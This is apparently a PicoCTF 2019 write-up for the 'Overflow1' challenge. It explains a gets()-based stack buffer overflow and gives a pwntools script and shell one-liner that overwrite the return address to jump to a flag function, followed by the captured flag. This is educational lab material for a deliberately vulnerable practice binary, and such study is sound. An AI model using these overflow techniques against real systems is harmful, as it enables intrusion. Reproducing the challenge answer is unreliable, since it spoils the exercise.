# PicoCTF 2019 - Binary Exploit - Overflow1

Simple buffer overflow,
the actual vulnerability is inside the function 'vuln'

## The vulnerability
it calls 'gets', a function that is known to be very dangerous (it even says it in the man page to never use this function) The reason this function is dangerous is because of how it works: 'gets(char \*s) reads a line from stdin into the buffer pointed to by s until either a terminating newline or EOF, which it replaces with a null byte ('\0'). No check for buffer overrun is performed, so it keeps reading input, even if this is way bigger than the amount of memory allocated for that string causing it to overwrite values from the stack.

## File info
```
[Sain@kali:~/ctf/CTF_Writeups/picoCTF2019/Binary/OverFlow1]$ file vuln
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=5d4cdc8dc51fb3e5d45c2a59c6a9cd7958382fc9, not stripped
[Sain@kali:~/ctf/CTF_Writeups/picoCTF2019/Binary/OverFlow1]$ checksec vuln
[*] '/home/sain/ctf/CTF_Writeups/picoCTF2019/Binary/OverFlow1/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments

```
## Exploiting it
The plan is to overwrite the return address by overflowing the buffer and rewriting the values on the stack.

First we need to find the buffer (how many characters are allocated to fit in the given string)

We are given the source code so we can see the 'buffsize' variable which is the used buffer here for our string, so our string is allocated to hold 64 characters

so if we give as input a string of 64 characters + 4 characters we are overflowing our buffer.. yay :)

but we arent overwriting our return pointer yet, its still a few bytes out of range!

if we dissassembly and go through the 'vuln' function step by step we can see the return address gets loaded from [ebp-0x4]
so lets walk through the program

___Registers note___;

* __esp__ = the stack pointer; it points to where the stack begins (the 'top' of the stack)

* __ebp__ = the stack frame pointer;

The stack grows from esp -> ebp -> and past it

![picture alt](https://i.gyazo.com/4f6fe4c601e114590933f72ca9aa6f54.png)

The look from $esp:

![picture alt](https://i.gyazo.com/7f06c8a65a792ed684dc6cf60e71b029.png)

As you can see, using a string "A" of length 64 we are still, 12 bytes of overwriting the return address to main
The address we want to overwrite is  `0x08048705` - it points to main+103
so we need to add 12 bytes to our overflow + another 4 bytes containing the address we want to jump to which is the flag function ( located @ `0x080485e6` )

Here is another picture of our stack
the string used was "A" * 64 + "B" * 12

![picture alt](https://i.gyazo.com/053b6657196d6664ebb6991b1d8504e8.png)

As you can see adding the 12 more bytes puts with the character B (0x42) puts the main address (`0x08048700`) right next to us 
(idk why it now points to main+98 and +103 earlier) 
now all that is left is to write the remaining 4 bytes as a address to the function we want
_Remember that you have to write the target address in little endian!_

now to write our exploit script, i used python & pwntools (note: this is setup to work locally, if you want it to work on the picoCTF server check exploit.py -i couldnt get the script to work properly using the pwntools ssh so you are supposed to run it manually now);

```python
from pwn import *
# Flag function is located @ 0x080485e6
flag_function = util.packing.p32(0x080485e6)
# overwrite our buffer + the 3 other addresses we dont need
buff = "A" * 64 + "B" * 12
payload = buff + flag_function
p = process("./vuln")
p.recvuntil("")
p.sendline(payload)
print p.recvall()
```

I had some trouble with the script but the output should be something like:
```
Sain@pico-2019-shell1:/problems/overflow-1_4_6e02703f87bc36775cc64de920dfcf5a$ python -c "print 'A' * 76 + '\xe6\x85\x04\x08'" | ./vuln
Give me a string and lets see what happens:
Woah, were jumping to 0x80485e6 !
picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5bbbf8810}Segmentation fault (core dumped)
```
